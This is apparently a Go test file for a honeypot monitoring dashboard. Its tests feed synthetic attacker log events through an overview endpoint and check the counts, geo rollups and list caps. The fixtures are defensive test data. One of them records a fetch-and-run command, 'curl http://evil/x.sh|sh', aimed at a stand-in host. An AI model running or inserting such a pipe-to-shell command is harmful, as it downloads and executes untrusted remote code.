package portal

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestOverviewAggregates drives a mixed log (scans, a session with commands and a
// credential, HTTP requests with a user-agent, a download, a honeytoken, plus a
// system notice) through the overview endpoint and checks every facet: the
// headline counts, the per-port scan breakdown, the geo-resolved country rollup,
// the top user agents, and the per-source footprint, and that the management-plane
// system notice never leaks into the attacker figures.
func TestOverviewAggregates(t *testing.T) {
	p := newTestPortal(t)
	geoPath := filepath.Join(t.TempDir(), "geo.csv")
	if err := os.WriteFile(geoPath, []byte("8.8.8.0,8.8.8.255,US\n"), 0600); err != nil {
		t.Fatalf("write geo csv: %v", err)
	}
	if _, err := p.geo.LoadCSV(geoPath); err != nil {
		t.Fatalf("load geo: %v", err)
	}

	lines := []string{
		// 8.8.8.8 (US): a bare scan on 23, then an ssh session with a credential and a command.
		`{"time":"2026-06-27T10:00:00Z","event":"PORT_SCAN","src_ip":"8.8.8.8","ip":"8.8.8.8:1111","port":23,"protocol":"telnet"}`,
		`{"time":"2026-06-27T10:00:01Z","event":"SESSION_START","src_ip":"8.8.8.8","ip":"8.8.8.8:2222","session":"s1","port":22,"protocol":"ssh"}`,
		`{"time":"2026-06-27T10:00:02Z","event":"CREDENTIAL","src_ip":"8.8.8.8","ip":"8.8.8.8:2222","session":"s1","port":22,"protocol":"ssh","username":"root","password":"toor"}`,
		`{"time":"2026-06-27T10:00:03Z","event":"COMMAND","src_ip":"8.8.8.8","ip":"8.8.8.8:2222","session":"s1","port":22,"protocol":"ssh","command":"uname -a"}`,
		`{"time":"2026-06-27T10:00:04Z","event":"HONEYTOKEN","src_ip":"8.8.8.8","ip":"8.8.8.8:2222","session":"s1","note":"vault","command":"vault"}`,
		// 10.0.0.9 (private): two HTTP requests with a user-agent, and a download attempt.
		`{"time":"2026-06-27T10:01:00Z","event":"HTTP_REQUEST","src_ip":"10.0.0.9","ip":"10.0.0.9:3333","port":80,"protocol":"http","method":"GET","path":"/","user_agent":"curl/8.4.0"}`,
		`{"time":"2026-06-27T10:01:01Z","event":"HTTP_REQUEST","src_ip":"10.0.0.9","ip":"10.0.0.9:3333","port":80,"protocol":"http","method":"GET","path":"/wp-login.php","user_agent":"curl/8.4.0"}`,
		`{"time":"2026-06-27T10:01:02Z","event":"DOWNLOAD_ATTEMPT","src_ip":"10.0.0.9","ip":"10.0.0.9:3333","port":80,"protocol":"http","url":"http://evil/x.sh"}`,
		`{"time":"2026-06-27T10:01:03Z","event":"EXEC_ATTEMPT","src_ip":"10.0.0.9","ip":"10.0.0.9:3333","port":80,"protocol":"http","command":"curl http://evil/x.sh|sh"}`,
		// A second scanner on 23, so the port's scan count is more than one.
		`{"time":"2026-06-27T10:02:00Z","event":"PORT_SCAN","src_ip":"203.0.113.5","ip":"203.0.113.5:4444","port":23,"protocol":"telnet"}`,
		// Management-plane noise that must be excluded from attacker figures.
		`{"time":"2026-06-27T10:03:01Z","event":"SYSTEM","message":"portal: country database loaded (1 ranges)"}`,
	}
	if err := os.WriteFile(p.cfg.LogFile, []byte(strings.Join(lines, "\n")+"\n"), 0600); err != nil {
		t.Fatalf("write log: %v", err)
	}

	eng := p.engine()
	req := httptest.NewRequest(http.MethodGet, "/dashboard/overview", nil)
	w := httptest.NewRecorder()
	eng.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("overview: status %d", w.Code)
	}

	var body struct {
		Totals struct {
			Events       int `json:"events"`
			Sources      int `json:"sources"`
			Sessions     int `json:"sessions"`
			PortScans    int `json:"port_scans"`
			Credentials  int `json:"credentials"`
			HTTPRequests int `json:"http_requests"`
			Downloads    int `json:"downloads"`
			Exec         int `json:"exec"`
			Bait         int `json:"bait"`
			UserAgents   int `json:"user_agents"`
		} `json:"totals"`
		GeoActive bool `json:"geo_active"`
		ByPort    []struct {
			Port     int    `json:"port"`
			Protocol string `json:"protocol"`
			Hits     int    `json:"hits"`
			Scans    int    `json:"scans"`
		} `json:"by_port"`
		ByCountry []struct {
			Country string `json:"country"`
			Sources int    `json:"sources"`
			Events  int    `json:"events"`
		} `json:"by_country"`
		UserAgents []struct {
			Agent   string `json:"agent"`
			Count   int    `json:"count"`
			Sources int    `json:"sources"`
		} `json:"user_agents"`
		Sources []struct {
			IP        string   `json:"ip"`
			Country   string   `json:"country"`
			Scope     string   `json:"scope"`
			Events    int      `json:"events"`
			Sessions  int      `json:"sessions"`
			Ports     []int    `json:"ports"`
			Protocols []string `json:"protocols"`
			Scanned   bool     `json:"scanned"`
		} `json:"sources"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &body); err != nil {
		t.Fatalf("bad json: %v", err)
	}

	// Headline counts: 10 attacker events (the SYSTEM notice excluded), across 3
	// sources.
	if body.Totals.Events != 10 {
		t.Fatalf("events = %d, want 10 (management-plane events excluded)", body.Totals.Events)
	}
	if body.Totals.Sources != 3 {
		t.Fatalf("sources = %d, want 3", body.Totals.Sources)
	}
	if body.Totals.PortScans != 2 || body.Totals.Sessions != 1 || body.Totals.Credentials != 1 ||
		body.Totals.HTTPRequests != 2 || body.Totals.Downloads != 1 || body.Totals.Exec != 1 ||
		body.Totals.Bait != 1 || body.Totals.UserAgents != 1 {
		t.Fatalf("totals wrong: %+v", body.Totals)
	}
	if !body.GeoActive {
		t.Fatal("geo_active should be true with a database loaded")
	}

	// Port 23 was hit only by two bare scans, so its hit and scan counts match.
	var p23 *struct {
		Port     int    `json:"port"`
		Protocol string `json:"protocol"`
		Hits     int    `json:"hits"`
		Scans    int    `json:"scans"`
	}
	for i := range body.ByPort {
		if body.ByPort[i].Port == 23 {
			p23 = &body.ByPort[i]
			break
		}
	}
	if p23 == nil || p23.Hits != 2 || p23.Scans != 2 || p23.Protocol != "telnet" {
		t.Fatalf("by_port for :23 = %+v, want telnet hits=2 scans=2 (full: %+v)", p23, body.ByPort)
	}

	// Country rollup: the US source resolves to a country; the private and
	// documentation-range scanners fall back to their scope labels.
	gotCountry := map[string]int{}
	for _, cc := range body.ByCountry {
		gotCountry[cc.Country] = cc.Sources
	}
	if gotCountry["US"] != 1 {
		t.Fatalf("by_country US sources = %d, want 1 (full: %+v)", gotCountry["US"], body.ByCountry)
	}
	if gotCountry["private"] != 1 {
		t.Fatalf("by_country private sources = %d, want 1 (full: %+v)", gotCountry["private"], body.ByCountry)
	}

	// User agents: curl was sent twice by one source.
	if len(body.UserAgents) != 1 || body.UserAgents[0].Agent != "curl/8.4.0" ||
		body.UserAgents[0].Count != 2 || body.UserAgents[0].Sources != 1 {
		t.Fatalf("user_agents = %+v, want curl/8.4.0 count=2 sources=1", body.UserAgents)
	}

	// Per-source footprint for the busiest source (8.8.8.8: scan + 4 session events).
	var top *struct {
		IP        string   `json:"ip"`
		Country   string   `json:"country"`
		Scope     string   `json:"scope"`
		Events    int      `json:"events"`
		Sessions  int      `json:"sessions"`
		Ports     []int    `json:"ports"`
		Protocols []string `json:"protocols"`
		Scanned   bool     `json:"scanned"`
	}
	for i := range body.Sources {
		if body.Sources[i].IP == "8.8.8.8" {
			top = &body.Sources[i]
			break
		}
	}
	if top == nil {
		t.Fatalf("8.8.8.8 missing from sources: %+v", body.Sources)
	}
	if top.Country != "US" || top.Events != 5 || top.Sessions != 1 || !top.Scanned {
		t.Fatalf("8.8.8.8 source = %+v, want US events=5 sessions=1 scanned=true", *top)
	}
	// It touched both the scanned telnet port (23) and the ssh session port (22).
	if !containsInt(top.Ports, 23) || !containsInt(top.Ports, 22) {
		t.Fatalf("8.8.8.8 ports = %v, want both 23 and 22", top.Ports)
	}
	if !containsStr(top.Protocols, "telnet") || !containsStr(top.Protocols, "ssh") {
		t.Fatalf("8.8.8.8 protocols = %v, want both telnet and ssh", top.Protocols)
	}
}

// TestOverviewCapsBusySensor proves the headline-vs-list contract on a sensor that
// has seen more sources and user agents than the response caps: the totals report
// the true counts while the returned lists are truncated to the caps, and the
// truncation keeps the busiest sources (it sorts before it cuts).
// TestOverviewTodayCounts checks the live-feed stat cards' source of truth: the
// server-side "today" block counts only events dated today (UTC) over the full
// log, so a busy sensor's cards are not undercounted by the browser's capped event
// buffer. Past-dated events count toward cumulative totals but not toward today.
func TestOverviewTodayCounts(t *testing.T) {
	p := newTestPortal(t)
	today := time.Now().UTC().Format("2006-01-02")
	lines := []string{
		`{"time":"` + today + `T08:00:00Z","event":"SESSION_START","src_ip":"9.9.9.9","ip":"9.9.9.9:1","session":"a","port":22,"protocol":"ssh"}`,
		`{"time":"` + today + `T08:00:01Z","event":"PORT_SCAN","src_ip":"9.9.9.9","ip":"9.9.9.9:1","port":23,"protocol":"telnet"}`,
		`{"time":"` + today + `T08:00:02Z","event":"HONEYTOKEN","src_ip":"9.9.9.9","ip":"9.9.9.9:1","session":"a","note":"vault"}`,
		`{"time":"` + today + `T08:00:03Z","event":"DOWNLOAD_ATTEMPT","src_ip":"8.8.4.4","ip":"8.8.4.4:2","port":80,"protocol":"http","url":"http://evil/x"}`,
		// A past day: counts toward cumulative totals, never toward today.
		`{"time":"2020-01-01T10:00:00Z","event":"SESSION_START","src_ip":"1.1.1.1","ip":"1.1.1.1:3","session":"b","port":22,"protocol":"ssh"}`,
		`{"time":"2020-01-01T10:00:01Z","event":"PORT_SCAN","src_ip":"1.1.1.1","ip":"1.1.1.1:3","port":23,"protocol":"telnet"}`,
	}
	if err := os.WriteFile(p.cfg.LogFile, []byte(strings.Join(lines, "\n")+"\n"), 0600); err != nil {
		t.Fatalf("write log: %v", err)
	}

	eng := p.engine()
	req := httptest.NewRequest(http.MethodGet, "/dashboard/overview", nil)
	w := httptest.NewRecorder()
	eng.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("overview: status %d", w.Code)
	}
	var body struct {
		Totals struct {
			Sessions int `json:"sessions"`
		} `json:"totals"`
		Today struct {
			Sessions  int `json:"sessions"`
			Sources   int `json:"sources"`
			Downloads int `json:"downloads"`
			Bait      int `json:"bait"`
			PortScans int `json:"port_scans"`
		} `json:"today"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &body); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if body.Totals.Sessions != 2 {
		t.Errorf("cumulative sessions = %d, want 2 (today + the past one)", body.Totals.Sessions)
	}
	if body.Today.Sessions != 1 {
		t.Errorf("today.sessions = %d, want 1", body.Today.Sessions)
	}
	if body.Today.Sources != 2 {
		t.Errorf("today.sources = %d, want 2 (9.9.9.9 and 8.8.4.4)", body.Today.Sources)
	}
	if body.Today.PortScans != 1 {
		t.Errorf("today.port_scans = %d, want 1 (the past scan excluded)", body.Today.PortScans)
	}
	if body.Today.Bait != 1 {
		t.Errorf("today.bait = %d, want 1", body.Today.Bait)
	}
	if body.Today.Downloads != 1 {
		t.Errorf("today.downloads = %d, want 1", body.Today.Downloads)
	}
}

func TestOverviewCapsBusySensor(t *testing.T) {
	p := newTestPortal(t)
	const nSrc, nUA = 350, 60

	var b strings.Builder
	for i := 0; i < nSrc; i++ {
		ip := fmt.Sprintf("45.%d.%d.1", i/256, i%256)
		// Source 0 is the busiest, so the cap must keep it after sorting.
		reps := 1
		if i == 0 {
			reps = 5
		}
		for r := 0; r < reps; r++ {
			fmt.Fprintf(&b, `{"time":"2026-06-27T11:%02d:%02dZ","event":"COMMAND","src_ip":"%s","ip":"%s:9","session":"c%d","command":"id"}`+"\n", i%60, r, ip, ip, i)
		}
		// The first nUA sources each present a distinct user agent.
		if i < nUA {
			fmt.Fprintf(&b, `{"time":"2026-06-27T11:%02d:30Z","event":"HTTP_REQUEST","src_ip":"%s","ip":"%s:9","port":80,"protocol":"http","user_agent":"ua-%d"}`+"\n", i%60, ip, ip, i)
		}
	}
	if err := os.WriteFile(p.cfg.LogFile, []byte(b.String()), 0600); err != nil {
		t.Fatalf("write log: %v", err)
	}

	eng := p.engine()
	req := httptest.NewRequest(http.MethodGet, "/dashboard/overview", nil)
	w := httptest.NewRecorder()
	eng.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("overview: status %d", w.Code)
	}

	var body struct {
		Totals struct {
			Sources    int `json:"sources"`
			UserAgents int `json:"user_agents"`
		} `json:"totals"`
		UserAgents []struct {
			Agent string `json:"agent"`
		} `json:"user_agents"`
		Sources []struct {
			IP     string `json:"ip"`
			Events int    `json:"events"`
		} `json:"sources"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &body); err != nil {
		t.Fatalf("bad json: %v", err)
	}

	// Headline totals are the true counts; the returned lists are capped.
	if body.Totals.Sources != nSrc {
		t.Fatalf("totals.sources = %d, want the full %d (not the cap)", body.Totals.Sources, nSrc)
	}
	if len(body.Sources) != overviewSourceCap {
		t.Fatalf("sources returned = %d, want the %d cap", len(body.Sources), overviewSourceCap)
	}
	if body.Totals.UserAgents != nUA {
		t.Fatalf("totals.user_agents = %d, want the full %d", body.Totals.UserAgents, nUA)
	}
	if len(body.UserAgents) != 50 {
		t.Fatalf("user_agents returned = %d, want the 50 cap", len(body.UserAgents))
	}
	// Sorted-then-capped: the busiest source (0, six events) survives and leads.
	if body.Sources[0].IP != "45.0.0.1" || body.Sources[0].Events != 6 {
		t.Fatalf("busiest source = %s (%d ev), want 45.0.0.1 with 6", body.Sources[0].IP, body.Sources[0].Events)
	}
}

func containsInt(xs []int, v int) bool {
	for _, x := range xs {
		if x == v {
			return true
		}
	}
	return false
}

func containsStr(xs []string, v string) bool {
	for _, x := range xs {
		if x == v {
			return true
		}
	}
	return false
}
